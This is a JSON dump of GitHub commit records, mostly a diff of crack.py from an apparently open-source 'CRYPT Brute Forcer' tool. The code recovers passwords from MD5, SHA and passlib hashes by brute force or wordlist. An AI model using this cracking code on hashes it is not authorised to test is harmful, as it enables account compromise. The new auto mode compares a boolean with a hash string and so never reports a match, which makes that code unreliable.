pickledList3=pickle.dumps(idlist3) ","sourceWithComments":"#!\/usr\/bin\/env python\nimport pickle\nimport numpy as np \nimport pandas as pd\nfrom sklearn.cluster import KMeans\nfrom sklearn import neighbors\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.preprocessing import MinMaxScaler\n\ndf = pd.read_csv('books.csv',error_bad_lines = False)\ndf.head()\n\ndf.fillna(0,inplace=True)\ndf.isnull().sum()\n\ndf2 = df.copy()\ndf2.loc[ (df2['average_rating'] >= 0) & (df2['average_rating'] <= 1), 'rating_between'] = \"between 0 and 1\"\ndf2.loc[ (df2['average_rating'] > 1) & (df2['average_rating'] <= 2), 'rating_between'] = \"between 1 and 2\"\ndf2.loc[ (df2['average_rating'] > 2) & (df2['average_rating'] <= 3), 'rating_between'] = \"between 2 and 3\"\ndf2.loc[ (df2['average_rating'] > 3) & (df2['average_rating'] <= 4), 'rating_between'] = \"between 3 and 4\"\ndf2.loc[ (df2['average_rating'] > 4) & (df2['average_rating'] <= 5), 'rating_between'] = \"between 4 and 5\"\n\nrating_df = pd.get_dummies(df2['rating_between'])\n\nfeatures = pd.concat([rating_df, df2['average_rating'], df2['ratings_count']], axis=1)\n\nfrom sklearn.preprocessing import MinMaxScaler\nmin_max_scaler = MinMaxScaler()\nfeatures = min_max_scaler.fit_transform(features)\n\nmodel1 = neighbors.NearestNeighbors(n_neighbors=6, algorithm='brute_force')\nmodel1.fit(features)\ndist1, idlist1 = model1.kneighbors(features)\n\nmodel2 = neighbors.NearestNeighbors(n_neighbors=6, algorithm='ball_tree')\nmodel2.fit(features)\ndist2, idlist2 = model2.kneighbors(features)\n\nmodel3 = neighbors.NearestNeighbors(n_neighbors=6, algorithm='kd_tree')\nmodel3.fit(features)\ndist3, idlist3 = model3.kneighbors(features)\n\npickledDF = pickle.dumps(df2)\npickledList1 = pickle.dumps(idlist1)\npickledList2 = pickle.dumps(idlist2)\npickledList3 = pickle.dumps(idlist3)\n"}},"msg":"change brute_force to brute"}},"https:\/\/github.com\/N1nj4R8\/CRYPT":{"fd906a9b6c4d3f3d72f62196f1a9493f9a0317ed":{"url":"https:\/\/api.github.com\/repos\/N1nj4R8\/CRYPT\/commits\/fd906a9b6c4d3f3d72f62196f1a9493f9a0317ed","html_url":"https:\/\/github.com\/N1nj4R8\/CRYPT\/commit\/fd906a9b6c4d3f3d72f62196f1a9493f9a0317ed","message":"Merged the 2 file writing functions.\nRemoved dependency on functions.py.\nMade minor changes to Brute-Force function.\nCompleted Wordlist function.","sha":"fd906a9b6c4d3f3d72f62196f1a9493f9a0317ed","keyword":"brute force change","diff":"diff --git a\/modules\/crack.py b\/modules\/crack.py\nindex 9bc7a18..3605024 100755\n--- a\/modules\/crack.py\n+++ b\/modules\/crack.py\n@@ -1,285 +1,229 @@\n-# -*- coding: UTF-8 -*-\r\n-\"\"\"\r\n-    CRYPT Brute Forcer, Password Hash Brute Forcing Tool\r\n-    Copyright (C) 2022  N1nj4 R8\r\n-\r\n-    CRYPT Brute Forcer is free software: you can redistribute it and\/or modify\r\n-    it under the terms of the GNU General Public License as published by\r\n-    the Free Software Foundation, either version 3 of the License, or\r\n-    any later version.\r\n-\r\n-    CRYPT Brute Forcer is distributed in the hope that it will be useful,\r\n-    but WITHOUT ANY WARRANTY; without even the implied warranty of\r\n-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\r\n-    GNU General Public License for more details.\r\n-\r\n-    You should have received a copy of the GNU General Public License\r\n-    along with CRYPT Brute Forcer.  If not, see <https:\/\/www.gnu.org\/licenses\/>.\r\n-\"\"\"\r\n-\r\n-\r\n-from passlib.context import CryptContext\r\n-from pathlib import Path\r\n-from brute import brute\r\n-from tqdm import tqdm\r\n-import modules.clear as clear\r\n-import time\r\n-import modules.main as main\r\n-from os import sep\r\n-from modules.functions import md5, sha256, sha512\r\n-\r\n-# Colors\r\n-grn = \"\\x1b[0;32m\"  # Green\r\n-red = \"\\x1b[0;31m\"  # Red\r\n-wte = \"\\x1b[0;37m\"  # White\r\n-ppl = \"\\x1b[0;35m\"  # Purple (Magenta)\r\n-ylo = \"\\x1b[0;36m\"  # Yellow\r\n-blu = \"\\x1b[0;36m\"  # Blue\r\n-cyn = \"\\x1b[0;36m\"  # Cyan\r\n-gry = \"\\x1b[0;90m\"  # Grey (Light Black)\r\n-\r\n-\r\n-enc_path = f\".{sep}Results{sep}Encrypted.txt\"\r\n-dec_path = f\".{sep}Results{sep}Decrypted.txt\"\r\n-\r\n-\r\n-def enc_writer(\r\n-    txt: str,\r\n-    cipher: str,\r\n-    method: str | dict[int, str],\r\n-    path: str = enc_path,\r\n-    cc: bool = False,\r\n-    cc_key: int | None = None,\r\n-    is_hash: bool = False,\r\n-):\r\n-    \"\"\"\r\n-    Parameters:\r\n-    ---\r\n-        Required:\r\n-        ---\r\n-        - txt: The input text.\r\n-        - cipher: The cipher name; 'Base64', 'Morse Code', and ... .\r\n-        - method: The function that encrypts the text.\r\n-        * Example: Base64 --> base64_encrypt(bytes(txt, \"utf-8\"))\r\n-\r\n-        Optional:\r\n-        ---\r\n-        - path: The path to write the file.\r\n-        - cc: checks if it's Caesar Cipher; Default is False.\r\n-        - cc_key: The key used to shift the text.\r\n-        - is_hash: True if it's a hash; Default is False.\r\n-    \"\"\"\r\n-    deco = \"#\" * 50\r\n-    times = (\r\n-        f\"\\n At {time.localtime().tm_hour}:{time.localtime().tm_min}:{time.localtime().tm_sec}\"\r\n-        f\" {time.localtime().tm_mday}\/{time.localtime().tm_mon}\/{time.localtime().tm_year}\"\r\n-    )\r\n-\r\n-    enc_text = f\"{deco}{times}\\n\\n Plain Text: {txt}\\n\\n Encrypted {cipher}: {method}\\n\\n{deco}\\n\"\r\n-    if cc:\r\n-        enc_text = f\"{deco}{times}\\n\\n Plain Text: {txt}\\n key: {cc_key}\\n\\n Encrypted {cipher}: {method}\\n\\n{deco}\\n\"\r\n-    if is_hash:\r\n-        enc_text = f\"{deco}{times}\\n\\n Plain Text: {txt}\\n\\n {cipher} Hash: {method}\\n\\n{deco}\\n\"\r\n-    path_dir = path.split(sep)\r\n-    path_dir = path_dir.pop(-1)\r\n-    save_dir = Path(path_dir)\r\n-    if not save_dir.exists():\r\n-        save_dir.mkdir(parents=True)\r\n-    encrypted_file = open(path, \"a+\")\r\n-    encrypted_file.write(enc_text)\r\n-    encrypted_file.close()\r\n-\r\n-\r\n-def dec_writer(\r\n-    txt: str,\r\n-    cipher: str,\r\n-    method: str | dict[int, str],\r\n-    path: str = dec_path,\r\n-    cc: bool = False,\r\n-    cc_key: int | None = None,\r\n-    is_hash: bool = False,\r\n-):\r\n-    \"\"\"\r\n-    Parameters:\r\n-    ---\r\n-    - txt: The input text.\r\n-    - cipher: The cipher name; 'Base64', 'Caesar Cipher', and ...\r\n-    - method: The function that decrypts the text;\r\n-    * Example: Base64 -> base64_decrypt(bytes(txt, \"utf-8\"))\r\n-\r\n-    Optional:\r\n-    - path: The path to write the file; If not set, default will be used.\r\n-    - cc: checks if it's Caesar Cipher; Default is False.\r\n-    - cc_key: The key used to shift the text.\r\n-    \"\"\"\r\n-    deco = \"#\" * 50\r\n-    times = (\r\n-        f\"\\n At {time.localtime().tm_hour}:{time.localtime().tm_min}:{time.localtime().tm_sec}\"\r\n-        f\" {time.localtime().tm_mday}\/{time.localtime().tm_mon}\/{time.localtime().tm_year}\"\r\n-    )\r\n-\r\n-    dec_text = f\"{deco}{times}\\n\\n Encrypted {cipher}: {txt}\\n\\n Decrypted Text: {method}\\n\\n{deco}\\n\"\r\n-    if cc:\r\n-        dec_text = f\"{deco}{times}\\n\\n Encrypted {cipher}: {txt}\\n Key: {cc_key}\\n\\n Decrypted Text: {method}\\n\\n{deco}\\n\"\r\n-    if is_hash:\r\n-        dec_text = f\"{deco}{times}\\n\\n Hash: {txt}\\n\\n {cipher} Decrypted: {method}\\n\\n{deco}\\n\"\r\n-    path_dir = path.split(sep)\r\n-    path_dir = path_dir.pop(-1)\r\n-    save_dir = Path(path_dir)\r\n-    if not save_dir.exists():\r\n-        save_dir.mkdir(parents=True)\r\n-    decrypted_file = open(path, \"a+\")\r\n-    decrypted_file.write(dec_text)\r\n-    decrypted_file.close()\r\n-\r\n-\r\n-def crackHash_menu(file_write: bool):\r\n-    while True:\r\n-        clear.cl_all_v2()\r\n-        print(main.menu_crackers())\r\n-        cmd_cracker = input(f\"{grn}        CRYPT>{wte} \")\r\n-        if cmd_cracker == \"1\":  # Brute Force\r\n-            clear.cl_all_v2()\r\n-            hash = input(f\"\\n{grn}        [+] Hash:{wte} \")\r\n-            length = int(input(f\"\\n{grn}        [+] Max Length:{wte} \"))\r\n-            print(\r\n-                \"\\nIf 1, ramp up from start_length till length; Otherwise, iterate over current length values.\"\r\n-            )\r\n-            ramp = bool(int(input(f\"{grn}        [+] Ramp? [1\/0]:{wte} \")))\r\n-            start_length = int(input(f\"\\n{grn}        [+] Start length [0<=]:{wte} \"))\r\n-            have_letters = bool(\r\n-                int(input(f\"\\n{grn}        [+] Include Letters? [1\/0]:{wte} \"))\r\n-            )\r\n-            have_symbols = bool(\r\n-                int(input(f\"\\n{grn}        [+] Include Symbols? [1\/0]:{wte} \"))\r\n-            )\r\n-            have_numbers = bool(\r\n-                int(input(f\"\\n{grn}        [+] Include Numbers? [1\/0]:{wte} \"))\r\n-            )\r\n-            hash_type = input(\r\n-                f\"\\n{grn}        [+] Hash Type [md5\/sha256\/sha512\/auto]:{wte} \"\r\n-            ).lower()\r\n-            if (\r\n-                not hash_type in [\"md5\", \"sha256\", \"sha512\"]\r\n-                or not 3 <= len(hash_type) <= 6\r\n-            ):\r\n-                hash_type = \"auto\"\r\n-            results = crackHash_BruteForce(\r\n-                hash=hash,\r\n-                length=length,\r\n-                ramp=ramp,\r\n-                start_length=start_length,\r\n-                have_letters=have_letters,\r\n-                have_symbols=have_symbols,\r\n-                have_numbers=have_numbers,\r\n-                hash_type=hash_type,\r\n-            )\r\n-            print(f\"{ylo}\\n\\nResults:\\n{wte}{results}\")\r\n-\r\n-            if file_write:\r\n-                path = f\".{sep}Results{sep}Hash_BF.txt\"\r\n-                dec_writer(\r\n-                    hash,\r\n-                    \"Brute Forced\",\r\n-                    results,\r\n-                    path,\r\n-                    is_hash=True,\r\n-                )\r\n-            print(f\"{gry}\\n\\n\\t[!] {wte}Press ENTER to continue...\")\r\n-            input()\r\n-\r\n-        elif cmd_cracker == \"2\":  # Wordlist\r\n-            clear.cl_all_v2()\r\n-            hash = input(f\"\\n{grn}        [+] Hash:{wte} \")\r\n-\r\n-        elif cmd_cracker.upper() == \"B\":\r\n-            break\r\n-\r\n-\r\n-def crackHash_BruteForce(\r\n-    hash: str,\r\n-    length: int,\r\n-    ramp: bool,\r\n-    start_length: int = 1,\r\n-    have_letters: bool = True,\r\n-    have_symbols: bool = True,\r\n-    have_numbers: bool = True,\r\n-    hash_type: str = \"auto\",\r\n-):\r\n-    \"\"\"\r\n-    ----\r\n-    Parameters\r\n-    ----------\r\n-    * hash: Hash to crack.\r\n-    * length: Length of string to iterate through.\r\n-    * ramp: If true, ramp up from start_length till length; Otherwise, iterate over current length values.\r\n-    * have_letters: Include uppercase & lowercase letters; default: True.\r\n-    * have_symbols: Include symbols; default: True.\r\n-    * have_numbers: Include 0-9 digit; default: Trues.\r\n-    * start_length: The length of the string to begin ramping through; default: 1.\r\n-    * hash_type: Type of hash trying to crack.\r\n-    \"\"\"\r\n-    bar = tqdm()\r\n-    results = \"Match not found\"\r\n-    ctx = CryptContext(\r\n-        [\r\n-            \"md5_crypt\",\r\n-            \"ldap_salted_md5\",\r\n-            \"sha256_crypt\",\r\n-            \"ldap_salted_sha256\",\r\n-            \"sha512_crypt\",\r\n-            \"ldap_salted_sha512\",\r\n-            \"bcrypt\",\r\n-            \"argon2\",\r\n-            \"nthash\",\r\n-            \"pbkdf2_sha256\",\r\n-            \"pbkdf2_sha512\",\r\n-        ]\r\n-    )\r\n-    for password in brute(\r\n-        start_length=start_length,\r\n-        length=length,\r\n-        letters=have_letters,\r\n-        symbols=have_symbols,\r\n-        numbers=have_numbers,\r\n-        ramp=ramp,\r\n-    ):\r\n-        bar.set_description_str(f\"Testing {password}\")\r\n-        if hash_type == \"auto\":\r\n-            check = ctx.verify(password, hash)\r\n-            if check:\r\n-                results = f\"Match found: {password}\"\r\n-                break\r\n-        elif hash_type == \"md5\":\r\n-            check = md5(password)\r\n-            if check == hash:\r\n-                results = f\"Match found: {password}\"\r\n-                break\r\n-        elif hash_type == \"sha256\":\r\n-            check = sha256(password)\r\n-            if check == hash:\r\n-                results = f\"Match found: {password}\"\r\n-                break\r\n-        elif hash_type == \"sha512\":\r\n-            check = sha512(password)\r\n-            if check == hash:\r\n-                results = f\"Match found: {password}\"\r\n-                break\r\n-        bar.update()\r\n-    bar.close()\r\n-    return results\r\n-\r\n-\r\n-def crackHash_WordList(hash: str, file_path: str | Path):\r\n-    results = \"\"\r\n-    file_obj = open(file_path, \"r\", encoding=\"UTF-8\")\r\n-    bar = tqdm()\r\n-    for password in file_obj:\r\n-        bar.set_description(f\"Testing {password}\")\r\n-        if password == hash:\r\n-            print(\"Match found: \", password)\r\n-            bar.close()\r\n-            break\r\n-        bar.update()\r\n-\r\n-    return results\r\n+# -*- coding: UTF-8 -*-\n+\"\"\"\n+    CRYPT Brute Forcer, Password Hash Brute Forcing Tool\n+    Copyright (C) 2022  N1nj4 R8\n+\n+    CRYPT Brute Forcer is free software: you can redistribute it and\/or modify\n+    it under the terms of the GNU General Public License as published by\n+    the Free Software Foundation, either version 3 of the License, or\n+    any later version.\n+\n+    CRYPT Brute Forcer is distributed in the hope that it will be useful,\n+    but WITHOUT ANY WARRANTY; without even the implied warranty of\n+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n+    GNU General Public License for more details.\n+\n+    You should have received a copy of the GNU General Public License\n+    along with CRYPT Brute Forcer.  If not, see <https:\/\/www.gnu.org\/licenses\/>.\n+\"\"\"\n+\n+import subprocess\n+import sys\n+import os\n+import hashlib\n+from passlib.context import CryptContext\n+from pathlib import Path\n+from tqdm import tqdm\n+\n+# Colors\n+grn = \"\\x1b[0;32m\"  # Green\n+red = \"\\x1b[0;31m\"  # Red\n+wte = \"\\x1b[0;37m\"  # White\n+ppl = \"\\x1b[0;35m\"  # Purple (Magenta)\n+ylo = \"\\x1b[0;36m\"  # Yellow\n+blu = \"\\x1b[0;36m\"  # Blue\n+cyn = \"\\x1b[0;36m\"  # Cyan\n+gry = \"\\x1b[0;90m\"  # Grey (Light Black)\n+\n+default_path = f\".{os.sep}Results{os.sep}Results.txt\"\n+\n+\n+def fileWriter(\n+    txt: str | dict[str, str],\n+    cipher: str,\n+    result: str | dict[str, str],\n+    path: str = default_path,\n+    cc: bool = False,\n+    cc_key: int | str = \"Unknown\",\n+):\n+    \"\"\"\n+    Parameters:\n+    ---\n+    - txt: The input text.\n+    - cipher: The cipher name; 'Base64', 'Caesar Cipher', and ...\n+    - type: \"encrypt\" or \"decrypt\"; used for file naming.\n+    - result: The function's result that encrypts\/decrypts the text;\n+\n+    Optional:\n+    - path: The path to write the file; If not set, default will be used.\n+    - cc: checks if it's Caesar Cipher; Default is False.\n+    - cc_key: The key used to shift the text.\n+    - is_hash: Set to true if it's a hash; Default is False.\n+    \"\"\"\n+    ruler = \"#\" * 50\n+    template = f\"{ruler}\\n\\n Plain Text: {txt}\\n\\n {cipher}: {result}\\n\\n{ruler}\\n\"\n+    if cc:\n+        template = f\"{ruler}\\n\\n Plain text: {txt}\\n key: {cc_key}\\n\\n {cipher}: {result}\\n\\n{ruler}\\n\"\n+    path_dir = path.split(os.sep)\n+    path_dir.pop(-1)\n+    save_dir = Path(os.sep.join(path_dir))\n+    if not save_dir.exists():\n+        save_dir.mkdir(parents=True)\n+    with open(path, \"a+\") as file:\n+        file.write(template)\n+\n+\n+def cl():\n+    if sys.platform == \"win32\":\n+        os.system(\"cls\")\n+    elif sys.platform == \"linux\":\n+        os.system(\"clear\")\n+\n+\n+def md5(text: str) -> str:\n+    return hashlib.md5(text.encode()).hexdigest()\n+\n+\n+def sha256(text: str) -> str:\n+    return hashlib.sha256(text.encode()).hexdigest()\n+\n+\n+def sha512(text: str) -> str:\n+    return hashlib.sha512(text.encode()).hexdigest()\n+\n+\n+def crackHash_BruteForce(\n+    hash_input: str,\n+    length: int,\n+    ramp: bool,\n+    start_length: int = 1,\n+    have_letters: bool = True,\n+    have_symbols: bool = True,\n+    have_numbers: bool = True,\n+    hash_type: str = \"other\",\n+):\n+    \"\"\"\n+    ----\n+    Parameters\n+    ----------\n+    * hash: Hash to crack.\n+    * length: Length of string to iterate through.\n+    * ramp: If true, ramp up from start_length till length; Otherwise, iterate over current length values.\n+    * have_letters: Include uppercase & lowercase letters; default: True.\n+    * have_symbols: Include symbols; default: True.\n+    * have_numbers: Include 0-9 digit; default: Trues.\n+    * start_length: The length of the string to begin ramping through; default: 1.\n+    * hash_type: Type of hash trying to crack.\n+    \"\"\"\n+    from brute import brute\n+\n+    bar = tqdm(leave=True)\n+    results = \"Not found\"\n+    ctx = CryptContext(\n+        [\n+            \"md5_crypt\",\n+            \"ldap_salted_md5\",\n+            \"sha256_crypt\",\n+            \"ldap_salted_sha256\",\n+            \"sha512_crypt\",\n+            \"ldap_salted_sha512\",\n+            \"bcrypt\",\n+            \"argon2\",\n+            \"nthash\",\n+            \"pbkdf2_sha256\",\n+            \"pbkdf2_sha512\",\n+        ]\n+    )\n+    for password in brute(\n+        start_length=start_length,\n+        length=length,\n+        letters=have_letters,\n+        symbols=have_symbols,\n+        numbers=have_numbers,\n+        ramp=ramp,\n+    ):\n+        bar.set_description_str(f\"Testing '{password}'\")\n+        if hash_type == \"md5\":\n+            check = md5(password)\n+        elif hash_type == \"sha256\":\n+            check = sha256(password)\n+        elif hash_type == \"sha512\":\n+            check = sha512(password)\n+        else:\n+            check = ctx.verify(password, hash_input)\n+\n+        if check == hash_input:\n+            bar.set_description(f\"Matched '{password}'\")\n+            results = password\n+            break\n+\n+        bar.update()\n+    bar.close()\n+\n+    return results\n+\n+\n+def crackHash_WordList(hash_input: str, file_path: str, hash_type: str = \"other\"):\n+    \"\"\"\n+    ----\n+    Parameters\n+    ----------\n+    * hash_input: Hash to crack.\n+    * file_path: Path to wordlist.\n+    * hash_type: Type of hash trying to crack.\n+    \"\"\"\n+    ctx = CryptContext(\n+        [\n+            \"md5_crypt\",\n+            \"ldap_salted_md5\",\n+            \"sha256_crypt\",\n+            \"ldap_salted_sha256\",\n+            \"sha512_crypt\",\n+            \"ldap_salted_sha512\",\n+            \"bcrypt\",\n+            \"argon2\",\n+            \"nthash\",\n+            \"pbkdf2_sha256\",\n+            \"pbkdf2_sha512\",\n+        ]\n+    )\n+    results = \"Not found\"\n+    if sys.platform == \"linux\":\n+        file_size = (\n+            subprocess.check_output([\"wc\", \"-l\", file_path])\n+            .decode(\"utf-8\")\n+            .split(\" \")[0]\n+            .replace(\"L\", \"\")\n+        )\n+    else:\n+        file_size = (\n+            subprocess.check_output([\"find\", \"\/c\", \"\/v\", \"\", file_path])\n+            .decode()\n+            .split(\" \")[-1]\n+        )\n+    file_size = int(file_size)\n+\n+    bar = tqdm(total=file_size, unit=\"Lines\", leave=True)\n+    with open(file_path, \"r\", encoding=\"UTF-8\") as file_obj:\n+        for password in file_obj:\n+            password = password.strip()\n+            bar.set_description(f\"Testing '{password}'\")\n+            if hash_type == \"md5\":\n+                check = md5(password)\n+            elif hash_type == \"sha256\":\n+                check = sha256(password)\n+            elif hash_type == \"sha512\":\n+                check = sha512(password)\n+            else:\n+                check = ctx.verify(password, hash_input)\n+\n+            if check == hash_input:\n+                bar.colour = \"green\"\n+                bar.set_description(f\"Matched '{password}'\")\n+                results = password\n+                break\n+\n+            bar.update(1)\n+    bar.close()\n+\n+    return results\n","files":{"\/modules\/crack.py":{"changes":[{"diff":"\n-# -*- coding: UTF-8 -*-\r\n-\"\"\"\r\n-    CRYPT Brute Forcer, Password Hash Brute Forcing Tool\r\n-    Copyright (C) 2022  N1nj4 R8\r\n-\r\n-    CRYPT Brute Forcer is free software: you can redistribute it and\/or modify\r\n-    it under the terms of the GNU General Public License as published by\r\n-    the Free Software Foundation, either version 3 of the License, or\r\n-    any later version.\r\n-\r\n-    CRYPT Brute Forcer is distributed in the hope that it will be useful,\r\n-    but WITHOUT ANY WARRANTY; without even the implied warranty of\r\n-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\r\n-    GNU General Public License for more details.\r\n-\r\n-    You should have received a copy of the GNU General Public License\r\n-    along with CRYPT Brute Forcer.  If not, see <https:\/\/www.gnu.org\/licenses\/>.\r\n-\"\"\"\r\n-\r\n-\r\n-from passlib.context import CryptContext\r\n-from pathlib import Path\r\n-from brute import brute\r\n-from tqdm import tqdm\r\n-import modules.clear as clear\r\n-import time\r\n-import modules.main as main\r\n-from os import sep\r\n-from modules.functions import md5, sha256, sha512\r\n-\r\n-# Colors\r\n-grn = \"\\x1b[0;32m\"  # Green\r\n-red = \"\\x1b[0;31m\"  # Red\r\n-wte = \"\\x1b[0;37m\"  # White\r\n-ppl = \"\\x1b[0;35m\"  # Purple (Magenta)\r\n-ylo = \"\\x1b[0;36m\"  # Yellow\r\n-blu = \"\\x1b[0;36m\"  # Blue\r\n-cyn = \"\\x1b[0;36m\"  # Cyan\r\n-gry = \"\\x1b[0;90m\"  # Grey (Light Black)\r\n-\r\n-\r\n-enc_path = f\".{sep}Results{sep}Encrypted.txt\"\r\n-dec_path = f\".{sep}Results{sep}Decrypted.txt\"\r\n-\r\n-\r\n-def enc_writer(\r\n-    txt: str,\r\n-    cipher: str,\r\n-    method: str | dict[int, str],\r\n-    path: str = enc_path,\r\n-    cc: bool = False,\r\n-    cc_key: int | None = None,\r\n-    is_hash: bool = False,\r\n-):\r\n-    \"\"\"\r\n-    Parameters:\r\n-    ---\r\n-        Required:\r\n-        ---\r\n-        - txt: The input text.\r\n-        - cipher: The cipher name; 'Base64', 'Morse Code', and ... .\r\n-        - method: The function that encrypts the text.\r\n-        * Example: Base64 --> base64_encrypt(bytes(txt, \"utf-8\"))\r\n-\r\n-        Optional:\r\n-        ---\r\n-        - path: The path to write the file.\r\n-        - cc: checks if it's Caesar Cipher; Default is False.\r\n-        - cc_key: The key used to shift the text.\r\n-        - is_hash: True if it's a hash; Default is False.\r\n-    \"\"\"\r\n-    deco = \"#\" * 50\r\n-    times = (\r\n-        f\"\\n At {time.localtime().tm_hour}:{time.localtime().tm_min}:{time.localtime().tm_sec}\"\r\n-        f\" {time.localtime().tm_mday}\/{time.localtime().tm_mon}\/{time.localtime().tm_year}\"\r\n-    )\r\n-\r\n-    enc_text = f\"{deco}{times}\\n\\n Plain Text: {txt}\\n\\n Encrypted {cipher}: {method}\\n\\n{deco}\\n\"\r\n-    if cc:\r\n-        enc_text = f\"{deco}{times}\\n\\n Plain Text: {txt}\\n key: {cc_key}\\n\\n Encrypted {cipher}: {method}\\n\\n{deco}\\n\"\r\n-    if is_hash:\r\n-        enc_text = f\"{deco}{times}\\n\\n Plain Text: {txt}\\n\\n {cipher} Hash: {method}\\n\\n{deco}\\n\"\r\n-    path_dir = path.split(sep)\r\n-    path_dir = path_dir.pop(-1)\r\n-    save_dir = Path(path_dir)\r\n-    if not save_dir.exists():\r\n-        save_dir.mkdir(parents=True)\r\n-    encrypted_file = open(path, \"a+\")\r\n-    encrypted_file.write(enc_text)\r\n-    encrypted_file.close()\r\n-\r\n-\r\n-def dec_writer(\r\n-    txt: str,\r\n-    cipher: str,\r\n-    method: str | dict[int, str],\r\n-    path: str = dec_path,\r\n-    cc: bool = False,\r\n-    cc_key: int | None = None,\r\n-    is_hash: bool = False,\r\n-):\r\n-    \"\"\"\r\n-    Parameters:\r\n-    ---\r\n-    - txt: The input text.\r\n-    - cipher: The cipher name; 'Base64', 'Caesar Cipher', and ...\r\n-    - method: The function that decrypts the text;\r\n-    * Example: Base64 -> base64_decrypt(bytes(txt, \"utf-8\"))\r\n-\r\n-    Optional:\r\n-    - path: The path to write the file; If not set, default will be used.\r\n-    - cc: checks if it's Caesar Cipher; Default is False.\r\n-    - cc_key: The key used to shift the text.\r\n-    \"\"\"\r\n-    deco = \"#\" * 50\r\n-    times = (\r\n-        f\"\\n At {time.localtime().tm_hour}:{time.localtime().tm_min}:{time.localtime().tm_sec}\"\r\n-        f\" {time.localtime().tm_mday}\/{time.localtime().tm_mon}\/{time.localtime().tm_year}\"\r\n-    )\r\n-\r\n-    dec_text = f\"{deco}{times}\\n\\n Encrypted {cipher}: {txt}\\n\\n Decrypted Text: {method}\\n\\n{deco}\\n\"\r\n-    if cc:\r\n-        dec_text = f\"{deco}{times}\\n\\n Encrypted {cipher}: {txt}\\n Key: {cc_key}\\n\\n Decrypted Text: {method}\\n\\n{deco}\\n\"\r\n-    if is_hash:\r\n-        dec_text = f\"{deco}{times}\\n\\n Hash: {txt}\\n\\n {cipher} Decrypted: {method}\\n\\n{deco}\\n\"\r\n-    path_dir = path.split(sep)\r\n-    path_dir = path_dir.pop(-1)\r\n-    save_dir = Path(path_dir)\r\n-    if not save_dir.exists():\r\n-        save_dir.mkdir(parents=True)\r\n-    decrypted_file = open(path, \"a+\")\r\n-    decrypted_file.write(dec_text)\r\n-    decrypted_file.close()\r\n-\r\n-\r\n-def crackHash_menu(file_write: bool):\r\n-    while True:\r\n-        clear.cl_all_v2()\r\n-        print(main.menu_crackers())\r\n-        cmd_cracker = input(f\"{grn}        CRYPT>{wte} \")\r\n-        if cmd_cracker == \"1\":  # Brute Force\r\n-            clear.cl_all_v2()\r\n-            hash = input(f\"\\n{grn}        [+] Hash:{wte} \")\r\n-            length = int(input(f\"\\n{grn}        [+] Max Length:{wte} \"))\r\n-            print(\r\n-                \"\\nIf 1, ramp up from start_length till length; Otherwise, iterate over current length values.\"\r\n-            )\r\n-            ramp = bool(int(input(f\"{grn}        [+] Ramp? [1\/0]:{wte} \")))\r\n-            start_length = int(input(f\"\\n{grn}        [+] Start length [0<=]:{wte} \"))\r\n-            have_letters = bool(\r\n-                int(input(f\"\\n{grn}        [+] Include Letters? [1\/0]:{wte} \"))\r\n-            )\r\n-            have_symbols = bool(\r\n-                int(input(f\"\\n{grn}        [+] Include Symbols? [1\/0]:{wte} \"))\r\n-            )\r\n-            have_numbers = bool(\r\n-                int(input(f\"\\n{grn}        [+] Include Numbers? [1\/0]:{wte} \"))\r\n-            )\r\n-            hash_type = input(\r\n-                f\"\\n{grn}        [+] Hash Type [md5\/sha256\/sha512\/auto]:{wte} \"\r\n-            ).lower()\r\n-            if (\r\n-                not hash_type in [\"md5\", \"sha256\", \"sha512\"]\r\n-                or not 3 <= len(hash_type) <= 6\r\n-            ):\r\n-                hash_type = \"auto\"\r\n-            results = crackHash_BruteForce(\r\n-                hash=hash,\r\n-                length=length,\r\n-                ramp=ramp,\r\n-                start_length=start_length,\r\n-                have_letters=have_letters,\r\n-                have_symbols=have_symbols,\r\n-                have_numbers=have_numbers,\r\n-                hash_type=hash_type,\r\n-            )\r\n-            print(f\"{ylo}\\n\\nResults:\\n{wte}{results}\")\r\n-\r\n-            if file_write:\r\n-                path = f\".{sep}Results{sep}Hash_BF.txt\"\r\n-                dec_writer(\r\n-                    hash,\r\n-                    \"Brute Forced\",\r\n-                    results,\r\n-                    path,\r\n-                    is_hash=True,\r\n-                )\r\n-            print(f\"{gry}\\n\\n\\t[!] {wte}Press ENTER to continue...\")\r\n-            input()\r\n-\r\n-        elif cmd_cracker == \"2\":  # Wordlist\r\n-            clear.cl_all_v2()\r\n-            hash = input(f\"\\n{grn}        [+] Hash:{wte} \")\r\n-\r\n-        elif cmd_cracker.upper() == \"B\":\r\n-            break\r\n-\r\n-\r\n-def crackHash_BruteForce(\r\n-    hash: str,\r\n-    length: int,\r\n-    ramp: bool,\r\n-    start_length: int = 1,\r\n-    have_letters: bool = True,\r\n-    have_symbols: bool = True,\r\n-    have_numbers: bool = True,\r\n-    hash_type: str = \"auto\",\r\n-):\r\n-    \"\"\"\r\n-    ----\r\n-    Parameters\r\n-    ----------\r\n-    * hash: Hash to crack.\r\n-    * length: Length of string to iterate through.\r\n-    * ramp: If true, ramp up from start_length till length; Otherwise, iterate over current length values.\r\n-    * have_letters: Include uppercase & lowercase letters; default: True.\r\n-    * have_symbols: Include symbols; default: True.\r\n-    * have_numbers: Include 0-9 digit; default: Trues.\r\n-    * start_length: The length of the string to begin ramping through; default: 1.\r\n-    * hash_type: Type of hash trying to crack.\r\n-    \"\"\"\r\n-    bar = tqdm()\r\n-    results = \"Match not found\"\r\n-    ctx = CryptContext(\r\n-        [\r\n-            \"md5_crypt\",\r\n-            \"ldap_salted_md5\",\r\n-            \"sha256_crypt\",\r\n-            \"ldap_salted_sha256\",\r\n-            \"sha512_crypt\",\r\n-            \"ldap_salted_sha512\",\r\n-            \"bcrypt\",\r\n-            \"argon2\",\r\n-            \"nthash\",\r\n-            \"pbkdf2_sha256\",\r\n-            \"pbkdf2_sha512\",\r\n-        ]\r\n-    )\r\n-    for password in brute(\r\n-        start_length=start_length,\r\n-        length=length,\r\n-        letters=have_letters,\r\n-        symbols=have_symbols,\r\n-        numbers=have_numbers,\r\n-        ramp=ramp,\r\n-    ):\r\n-        bar.set_description_str(f\"Testing {password}\")\r\n-        if hash_type == \"auto\":\r\n-            check = ctx.verify(password, hash)\r\n-            if check:\r\n-                results = f\"Match found: {password}\"\r\n-                break\r\n-        elif hash_type == \"md5\":\r\n-            check = md5(password)\r\n-            if check == hash:\r\n-                results = f\"Match found: {password}\"\r\n-                break\r\n-        elif hash_type == \"sha256\":\r\n-            check = 